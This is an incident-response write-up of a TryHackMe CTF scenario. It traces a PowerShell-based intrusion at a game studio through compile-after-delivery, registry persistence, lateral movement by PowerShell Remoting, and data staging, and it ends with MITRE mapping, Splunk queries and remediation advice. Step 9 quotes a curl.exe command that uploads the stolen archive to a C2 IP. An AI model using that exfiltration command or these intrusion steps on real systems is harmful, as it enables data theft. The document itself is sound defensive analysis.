# 🚨 Incident Report: Quiet as the Grave (Compile After Delivery & Data Exfiltration)

**Analyst:** mlwrdtctd  
**Date of Activity:** September 10, 2026  
**Severity:** Critical  
**Platform:** TryHackMe (CTF-Event)  
**Environment:** TryHatMe Studios (NeuralNexus Game Development)

---

## 📋 Executive Summary
On September 10, 2026, a targeted cyberattack was detected on a development workstation (`THM-SREYES`) belonging to user `s.reyes`. The attacker gained initial access via a malicious PowerShell script (`review-helper.ps1`) disguised as a game review tool. The attack utilized advanced Defense Evasion (Compile After Delivery) to bypass antivirus, established persistence via a Registry Run Key, moved laterally to another host (`THM-MSMITH`) to harvest sensitive marketing and project data, and ultimately exfiltrated the data using the legitimate `curl.exe` utility.

---

## 🎯 Scenario Objectives Addressed

*   **Obj 1 (Initial Access & Foothold):** Initial access was achieved via user execution of `review-helper.ps1` from the Downloads folder. The foothold was kept alive by creating a Registry Run Key (`NeuralNexusReview`), ensuring the script runs on every user logon.
*   **Obj 2 (Credentials & Lateral Movement):** The attacker operated under the context of user `s.reyes`. Lateral movement was traced using PowerShell Remoting (`New-PSSession`) to connect from `THM-SREYES` to `THM-MSMITH` to access sensitive data.
*   **Obj 3 (Reach & Reconnaissance):** The attacker's reach extended to the adjacent host `THM-MSMITH`. They targeted intellectual property, specifically marketing materials (`C:\StudioMarketing\approved-release\*`) and NeuralNexus release notes (`C:\StudioProjects\NeuralNexus\release-notes`).
*   **Obj 4 (Data Collection & Exfiltration):** Data was collected and staged in a temporary directory (`$env:TEMP\review-staging`), compressed into `review-cache.zip` using `Compress-Archive`, and successfully exfiltrated to the C2 server using `curl.exe`.

---

## 🔍 Kill Chain (Attack Timeline)

### Step 1: Opening Malicious File
*   **Timestamp:** `2026-09-10 12:29:48`
*   **Description:** The adversary prepared a malicious file (`C:\Users\s.reyes\Downloads\NeuralNexusReview\review-helper.ps1`) obfuscated as a game review tool. The file contains a malicious PowerShell script. It was opened by the user via `explorer.exe`, which spawned `powershell.exe`.
*   **Tactic:** Initial Access
*   **Technique:** Phishing (T1566) - *Assumption based on the file being downloaded to the Downloads folder.*
*   **User:** `s.reyes`
*   **Asset:** `THM-SREYES`
*   **IOCs:** `C:\Users\s.reyes\Downloads\NeuralNexusReview\review-helper.ps1`

![Step 1: User execution of the malicious script](https://raw.githubusercontent.com/mlwrdtctd/ctf-soc-writeups/refs/heads/main/02_Incident_Response_Reports/1_Opening%20Malicious%20File.png)

### Step 2: Execution of Malicious Script
*   **Timestamp:** `2026-09-10 12:29:49`
*   **Description:** `review-helper.ps1` executed a command that created a C# source code file (`nx3yvfmc.cmdline`) containing the payload and an empty DLL library file (`nx3yvfmc.dll`) - ProcessID 12412.
*   **Tactic:** Execution
*   **Technique:** Command and Scripting Interpreter: PowerShell (T1059.001)
*   **User:** `s.reyes`
*   **Asset:** `THM-SREYES`
*   **IOCs:** `nx3yvfmc.cmdline`, `nx3yvfmc.dll`

![Step 2: Creation of the C# source file and placeholder DLL](https://raw.githubusercontent.com/mlwrdtctd/ctf-soc-writeups/refs/heads/main/02_Incident_Response_Reports/2_cmdline%20file%20created.png)

![Step 2: Creation of the empty DLL placeholder](https://raw.githubusercontent.com/mlwrdtctd/ctf-soc-writeups/refs/heads/main/02_Incident_Response_Reports/2_dll%20file%20created.png)

### Step 3: Compilation (Defense Evasion)
*   **Timestamp:** `2026-09-10 12:29:49`
*   **Description:** The adversary used the legitimate `csc.exe` (Visual C# Command Line Compiler) to compile the payload into a DLL (`nx3yvfmc.dll`). This technique allowed the attacker to bypass antivirus detection, as the malicious code was generated directly on the victim's endpoint (Compile After Delivery).
*   **Tactic:** Defense Evasion
*   **Technique:** Obfuscated Files or Information: Compile After Delivery (T1027.004)
*   **User:** `s.reyes`
*   **Asset:** `THM-SREYES`
*   **IOCs:** `csc.exe`, `cvtres.exe`, `nx3yvfmc.dll`


### Step 4: C2 Server Contact
*   **Timestamp:** `2026-09-10 12:29:49 - 12:39:49`
*   **Description:** The compiled DLL (executed within the PowerShell process) established multiple outbound connections to the adversary's C2 server (`45.147.230.131`) on destination port `8443`. The use of port 8443 (alternative HTTPS) was intended to blend the traffic with legitimate encrypted web traffic and bypass firewall restrictions.
*   **Tactic:** Command and Control
*   **Technique:** Application Layer Protocol: Web Protocols (T1071.001) & Non-Standard Port (T1571)
*   **User:** `s.reyes`
*   **Asset:** `THM-SREYES`
*   **IOCs:** `45.147.230.131`, port `8443`


### Step 5: Persistence
*   **Timestamp:** `2026-09-10 12:37:20`
*   **Description:** The attacker established persistence by creating a Registry Run key named `NeuralNexusReview` under `HKU\...\Software\Microsoft\Windows\CurrentVersion\Run\`. The value points to a copied version of the malicious script (`C:\Users\s.reyes\AppData\Local\NeuralNexus\review-helper.ps1`), ensuring it executes every time user `s.reyes` logs in.
*   **Tactic:** Persistence
*   **Technique:** Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (T1547.001)
*   **User:** `s.reyes`
*   **Asset:** `THM-SREYES`
*   **IOCs:** Registry Key: `HKU\...\Run\NeuralNexusReview`; File: `C:\Users\s.reyes\AppData\Local\NeuralNexus\review-helper.ps1`

![Step 5: Persistence established via Registry Run Key](https://raw.githubusercontent.com/mlwrdtctd/ctf-soc-writeups/refs/heads/main/02_Incident_Response_Reports/5_Persistence.png)

### Step 6: Lateral Movement (PowerShell Remoting)
*   **Timestamp:** `2026-09-10 16:27:01`
*   **Description:** The attacker used PowerShell Remoting (`New-PSSession`) from the compromised host (`THM-SREYES`) to connect to the adjacent host `THM-MSMITH`, using the compromised credentials of `s.reyes`.
*   **Tactic:** Lateral Movement
*   **Technique:** Remote Services: PowerShell Remoting (T1021.006)
*   **User:** `s.reyes`
*   **Asset:** `THM-SREYES` (targeting `THM-MSMITH`)
*   **IOCs:** Command: `New-PSSession -ComputerName THM-MSMITH`

![Step 6: Lateral Movement via PowerShell Remoting (New-PSSession)](https://raw.githubusercontent.com/mlwrdtctd/ctf-soc-writeups/refs/heads/main/02_Incident_Response_Reports/6_Lateral%20Movement.png)

### Step 7: Collection (Data Staging)
*   **Timestamp:** `2026-09-10 16:27:01`
*   **Description:** Using the remote session, the attacker copied sensitive marketing materials from `C:\StudioMarketing\approved-release\` on `THM-MSMITH` and local NeuralNexus release notes from `C:\StudioProjects\NeuralNexus\release-notes` into a staging directory (`$env:TEMP\review-staging\`).
*   **Tactic:** Collection
*   **Technique:** Data from Local System (T1005) & Data from Network Shared Drive (T1039)
*   **User:** `s.reyes`
*   **Asset:** `THM-SREYES` & `THM-MSMITH`
*   **IOCs:** Paths: `C:\StudioMarketing\approved-release\*`, `C:\StudioProjects\NeuralNexus\release-notes`

![Step 7: Data Collection and Staging from remote and local systems](https://raw.githubusercontent.com/mlwrdtctd/ctf-soc-writeups/refs/heads/main/02_Incident_Response_Reports/7_Collection.png)

### Step 8: Archive Creation (Staging)
*   **Timestamp:** `2026-09-10 16:27:28`
*   **Description:** The attacker used the `Compress-Archive` PowerShell cmdlet to compress all collected files from the `review-staging` directory into a single archive named `review-cache.zip` in the Temp directory.
*   **Tactic:** Collection
*   **Technique:** Archive Collected Data: Archive via Utility (T1560.001)
*   **User:** `s.reyes`
*   **Asset:** `THM-SREYES`
*   **IOCs:** Archive: `C:\Users\s.reyes\AppData\Local\Temp\review-cache.zip`

![Step 8: Archive creation of the staged data (review-cache.zip)](https://raw.githubusercontent.com/mlwrdtctd/ctf-soc-writeups/refs/heads/main/02_Incident_Response_Reports/8_Archive%20Creation.png)

### Step 9: Exfiltration
*   **Timestamp:** `2026-09-10 16:27:54`
*   **Description:** The attacker used the legitimate `curl.exe` utility (Living off the Land) to upload the archive (`review-cache.zip`) to the C2 server (`https://45.147.230.131:8443/ingest/review-cache.zip`). The `--insecure` flag was used to ignore SSL certificate validation.
*   **Tactic:** Exfiltration
*   **Technique:** Exfiltration Over Web Service (T1567) & Exfiltration Over C2 Channel (T1041)
*   **User:** `s.reyes`
*   **Asset:** `THM-SREYES`
*   **IOCs:** Command: `curl.exe --fail --show-error --insecure --upload-file ... https://45.147.230.131:8443/ingest/review-cache.zip`

![Step 9: Data Exfiltration to the C2 server using curl.exe](https://raw.githubusercontent.com/mlwrdtctd/ctf-soc-writeups/refs/heads/main/02_Incident_Response_Reports/9_Exfiltration.png)

---

## 🚩 MITRE ATT&CK Mapping
| Tactic | Technique | ID |
| :--- | :--- | :--- |
| Initial Access | Phishing | T1566 |
| Execution | Command and Scripting Interpreter: PowerShell | T1059.001 |
| Defense Evasion | Obfuscated Files or Information: Compile After Delivery | T1027.004 |
| Command and Control | Application Layer Protocol: Web Protocols | T1071.001 |
| Command and Control | Non-Standard Port | T1571 |
| Persistence | Boot or Logon Autostart Execution: Registry Run Keys | T1547.001 |
| Lateral Movement | Remote Services: PowerShell Remoting | T1021.006 |
| Collection | Data from Local System | T1005 |
| Collection | Data from Network Shared Drive | T1039 |
| Collection | Archive Collected Data: Archive via Utility | T1560.001 |
| Exfiltration | Exfiltration Over Web Service | T1567 |
| Exfiltration | Exfiltration Over C2 Channel | T1041 |

---

## 🛡️ Recommendations

### Containment
*   Immediately isolate hosts `THM-SREYES` and `THM-MSMITH` from the network via EDR.
*   Block IP `45.147.230.131` and port `8443` at the perimeter firewall and proxy.

### Eradication
*   Delete the malicious files: `review-helper.ps1`, `nx3yvfmc.cmdline`, `nx3yvfmc.dll`, and `review-cache.zip`.
*   Remove the Registry Run key `NeuralNexusReview` from the affected user profile.

### Recovery & Prevention
*   Reset credentials for user `s.reyes` and any accounts accessed from `THM-MSMITH`.
*   Restrict the execution of compiler binaries (like `csc.exe`) for non-developer users.
*   Implement PowerShell Constrained Language Mode to prevent malicious script block execution.

---

## 📝 Key Splunk Queries Used
```spl
# 1. Identify initial execution of the malicious script
index=* "review-helper.ps1" | sort _time

# 2. Pivot on the spawned PowerShell process
index=* ProcessId="12412" | sort _time

# 3. Trace all activities for the compromised user session
index=* LogonId="0x1F9DB54" | sort _time

# 4. Identify the staging and exfiltration archive
index=* "review-cache.zip" | sort _time

# 5. Detect csc.exe compilation (Compile After Delivery)
index=* EventCode=1 Image="*csc.exe" CommandLine="*.cmdline*"
```
---

## 🛠️ Tools & Technologies Used

### Defensive Tools (Analyst Side)
*   **SIEM:** Splunk (SPL queries for event correlation and pivoting).
*   **Logging:** Sysmon (Event IDs 1, 3, 11, 13), Windows PowerShell Operational Logs (Event ID 4104).
*   **Threat Intelligence:** VirusTotal (IP reputation check).

### Offensive Tools (Adversary Side - Observed in Logs)
*   **Execution:** PowerShell (`powershell.exe`), `explorer.exe`.
*   **Defense Evasion:** `csc.exe` (C# Compiler), `cvtres.exe`.
*   **C2 / Exfiltration:** Custom C2 server (`45.147.230.131:8443`), `curl.exe` (Living off the Land).
*   **Collection / Staging:** `Compress-Archive` (PowerShell cmdlet), `New-PSSession`.

### Frameworks
*   MITRE ATT&CK Framework (for mapping TTPs).
